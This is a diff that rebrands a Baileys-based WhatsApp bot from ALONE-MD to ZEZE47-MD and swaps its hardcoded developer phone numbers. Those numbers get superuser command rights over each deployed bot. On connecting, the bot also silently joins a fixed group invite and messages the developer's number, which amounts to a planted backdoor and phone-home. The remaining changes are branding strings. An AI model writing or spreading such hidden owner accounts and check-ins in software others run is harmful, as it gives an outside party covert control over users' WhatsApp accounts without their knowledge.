@@ -81,7 +81,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['ALONE-MD', "safari", "1.0.0"],
+            browser: ['ZEZE47-MD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -155,10 +155,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255673750170';
-            const dj2 = '255673750170';
-            const dj3 = "255673750170";
-            const luffy = '255673750170';
+            const dj = '255682937675';
+            const dj2 = '255682937675';
+            const dj3 = "255682937675";
+            const luffy = '255682937675';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -166,7 +166,7 @@ setTimeout(() => {
 
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{ALONE Md}...[][]");
+            console.log("\t [][]...{ZEZE47 Md}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from : " + nomGroupe);
@@ -591,7 +591,7 @@ if (conf.CHAT_BOT === 'yes') {
                /** ****** gestion auto-status  */
       if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_STATUS_REPLY === "yes") {
   const user = ms.key.participant;
-  const text = `status viewed justnow with ALONE MD`;
+  const text = `status viewed justnow with ZEZE47 MD`;
 
   await zk.sendMessage(user, { 
     text: text,
@@ -732,7 +732,7 @@ if (conf.GROUP_CONTROL === "yes") {
       conf.verifAdmin && !conf.groupeAdmin.includes(ms.key.participant) && ms.key.remoteJid.includes("@g.us")) {
 
       // Respond to the message
-      repondre("_Alone md have just detected group link🧐_");
+      repondre("_Zeze47 md have just detected group link🧐_");
 
       const participant = ms.key.participant || ms.key.remoteJid;
       const chatId = ms.key.remoteJid;
@@ -786,7 +786,7 @@ if (conf.GROUP_CONTROL === "yes") {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Alone-Md',
+                pack: 'Zeze47-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -932,7 +932,7 @@ zk.ev.on('group-participants.update', async (group) => {
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
             let msg = `╔════◇◇◇═════╗
 ║ welcome to new(s) member(s)
-║ * 𝚃𝙷𝙸𝚂 𝙸𝚂 𝙰𝙻𝙾𝙽𝙴 𝙼𝙳 𝚆𝙰 𝙱𝙾𝚃:*
+║ * 𝚃𝙷𝙸𝚂 𝙸𝚂 ZEZE47 𝙼𝙳 𝚆𝙰 𝙱𝙾𝚃:*
 `;
 
             let membres = group.participants;
@@ -942,9 +942,9 @@ zk.ev.on('group-participants.update', async (group) => {
 
             msg += `║
 ╚════◇◇◇═════╝
-◇ *WElOME BUDDY... READ THE GRPUP DESCRIPTION 😊 *   ◇
+◇ *WELCOME BUDDY... READ THE GRPUP DESCRIPTION 😊 *   ◇
 
-${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
+${metadata.desc}\n\n> POWERED BY ZEZE TECH.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -997,9 +997,9 @@ ${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
 // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*❣️ALONE MD ANTIDELETE😋*\n\n`;
+  let notification = `*❣️ ZEZE47-MD ANTIDELETE😋*\n\n`;
   notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Toputech*\n\n`;
+  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Zezetech*\n\n`;
   return notification;
 }
 
@@ -1125,7 +1125,7 @@ zk.ev.on("messages.upsert", async m => {
       const senderNumber = sender.split('@')[0];
 
       // Update the auto-reply message dynamically
-      auto_reply_message = `Hello @${senderNumber}, A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Alone Md*.`;
+      auto_reply_message = `Hello @${senderNumber}, A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Zeze47 Md*.`;
 
       // Check if the message exists and is a command to set a new auto-reply message with any prefix
       if (messageText.match(/^[^\w\s]/) && ms.key.fromMe) {
@@ -1328,7 +1328,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ ALONE-MD connecting in your account...");
+                console.log("ℹ️ ZEZE47-MD connecting in your account...");
             }
             else if (connection === 'open') {await zk.groupAcceptInvite("DdKP0nI2ZAm1AgyDQGN0tF");
 
@@ -1337,20 +1337,20 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
 
 
 
-                console.log("✅ ALONE-MD connected successfully☺️");
+                console.log("✅ ZEZE47-MD connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("ALONE-MD by TOPUTECH installing cmds😇\n\n");
+                console.log("ZEZE47-MD by ZEZETECH installing cmds😇\n\n");
                 //chargement des commandes 
                 console.log("chargement des commandes ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
                             require(__dirname + "/commandes/" + fichier);
-                            console.log(fichier + "Successfully installed ALONE-MD commands✔️");
+                            console.log(fichier + "Successfully installed ZEZE47-MD commands✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
@@ -1380,10 +1380,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
     Prefix : [ ${prefixe} ]
     Mode :${md} mode
     Total Command : ${evt.cm.length}
-    Owner : TOPU TECH 🦸  
+    Owner : ZEZE TECH 🦸  
 
 > ❣️ *Im here laways 4r you* ❣️\n`;
-                await zk.sendMessage("255673750170@s.whatsapp.net", { text: cmsg });
+                await zk.sendMessage("255682937675@s.whatsapp.net", { text: cmsg });
                 }
             }
             else if (connection == "close") {
